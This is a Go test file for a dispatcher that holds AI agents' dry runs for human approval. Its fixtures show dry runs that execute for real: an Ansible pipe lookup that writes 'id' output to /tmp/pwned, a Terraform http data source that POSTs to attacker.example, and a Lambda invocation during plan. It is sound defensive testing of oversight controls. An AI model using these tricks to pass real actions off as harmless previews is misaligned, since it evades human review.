package dispatch

import (
	"context"
	"fmt"
	"io"
	"path/filepath"
	"testing"

	"github.com/kordloom/switchtender/internal/policy"
	"github.com/kordloom/switchtender/internal/roundhouse"
	"github.com/kordloom/switchtender/internal/run"
)

// redteamPluginTool is a tool name a plugin adds, registered once at package load so submission
// accepts it. Its dry run is whatever the plugin runs on the host, which the gate cannot scan.
const redteamPluginTool = "redteam-plugin"

// redteamRegister registers the plugin tool at package init, before any run is submitted, matching
// how an extension registers one. The value is unused; the init happens for its effect.
var redteamRegister = func() bool {
	if !run.ValidTool(redteamPluginTool) {
		run.RegisterTool(redteamPluginTool)
		roundhouse.RegisterRunner(redteamPluginTool, roundhouse.RunnerFunc(
			func(context.Context, roundhouse.Spec, io.Writer) (roundhouse.Result, error) {
				return roundhouse.Result{ExitCode: 0}, nil
			}))
	}
	return true
}()

// pipeLookupPlaybook runs a command on the controller through a pipe lookup during templating,
// which --check does not prevent, so the dry run is not a preview.
const pipeLookupPlaybook = `- hosts: all
  tasks:
    - name: exfiltrate during templating
      ansible.builtin.debug:
        msg: "{{ lookup('pipe', 'id > /tmp/pwned') }}"
`

// lambdaConfig invokes a Lambda function while the tool plans, through a data source whose read is
// an execution.
const lambdaConfig = `data "aws_lambda_invocation" "run" {
  function_name = "do-it"
  input         = "{}"
}
`

// httpPostConfig sends a POST request with a side effect while the tool plans.
const httpPostConfig = `data "http" "poke" {
  url    = "https://attacker.example/ingest"
  method = "POST"
}
`

// TestRedTeamAgentDryRunExecutesChangeFreeGap drives the built-in hold through Submit, the path a
// direct agent submission takes, for the dry runs the scanner judged change free before the fix: a
// pipe lookup, a Lambda invocation, an http POST, and a plugin tool whose dry run the gate cannot
// scan. Each is an agent's dry run that executes work for real, so each must wait for a person. The
// matching person's run is the control and goes ahead.
func TestRedTeamAgentDryRunExecutesChangeFreeGap(t *testing.T) {
	t.Parallel()
	_ = redteamRegister
	tests := []struct {
		// Tool is the tool of the dry run.
		Tool string
		// Playbook is the Ansible playbook content, empty for other tools.
		Playbook string
		// Config is the Terraform configuration content, empty for other tools.
		Config string
		// Command is a non-Ansible tool's command, empty for Ansible.
		Command string
		// Opts say who submits.
		Opts []run.SubmitOption
		// WantHeld is whether the dry run waits for a person.
		WantHeld bool
	}{{ // Test 0: An agent's pipe-lookup dry run is held.
		Tool: run.ToolAnsible, Playbook: pipeLookupPlaybook, Opts: agentOpts(), WantHeld: true,
	}, { // Test 1: The same dry run from a person goes ahead, the control for test 0.
		Tool: run.ToolAnsible, Playbook: pipeLookupPlaybook, Opts: personOpts(), WantHeld: false,
	}, { // Test 2: An agent's Lambda-invoking plan is held.
		Tool: run.ToolTerraform, Config: lambdaConfig, Opts: agentOpts(), WantHeld: true,
	}, { // Test 3: An agent's http POST plan is held.
		Tool: run.ToolTerraform, Config: httpPostConfig, Opts: agentOpts(), WantHeld: true,
	}, { // Test 4: An agent's plugin-tool dry run is held, since the gate cannot scan it.
		Tool: redteamPluginTool, Command: "do-stuff", Opts: agentOpts(), WantHeld: true,
	}, { // Test 5: The person's plugin-tool dry run goes ahead, the control for test 4.
		Tool: redteamPluginTool, Command: "do-stuff", Opts: personOpts(), WantHeld: false,
	}}
	for testNum, test := range tests {
		t.Run(fmt.Sprintf("test %d", testNum), func(t *testing.T) {
			t.Parallel()
			ctx := context.Background()
			store := run.NewMemStore()
			d := newAgentHoldDispatcher(t, store, nil)
			opts := append([]run.SubmitOption{run.WithTool(test.Tool), run.WithDryRun(true)},
				test.Opts...)
			playbook := ""
			switch test.Tool {
			case run.ToolAnsible:
				dir := t.TempDir()
				writeFiles(t, dir, map[string]string{"site.yml": test.Playbook})
				playbook = filepath.Join(dir, "site.yml")
			case run.ToolTerraform:
				dir := t.TempDir()
				writeFiles(t, dir, map[string]string{"main.tf": test.Config})
				opts = append(opts, run.WithCommand(dir))
			default:
				opts = append(opts, run.WithCommand(test.Command))
			}
			got, err := d.Submit(ctx, playbook, "hosts.ini", opts...)
			if err != nil {
				t.Fatalf("Submit() error = %v", err)
			}
			held := got.Status == run.StatusPendingApproval
			if held != test.WantHeld {
				t.Fatalf("held = %v, want %v (held by %q, findings %v)", held, test.WantHeld,
					got.HeldByPolicy, got.DryRunFindings())
			}
			if test.WantHeld && got.HeldByPolicy != policy.AgentDefaultName {
				t.Errorf("held by %q, want the built-in agent hold", got.HeldByPolicy)
			}
			if !test.WantHeld {
				if final := waitTerminal(t, store, got.ID); final.Status != run.StatusSucceeded {
					t.Errorf("status = %q, want the control run to have gone ahead", final.Status)
				}
			}
		})
	}
}
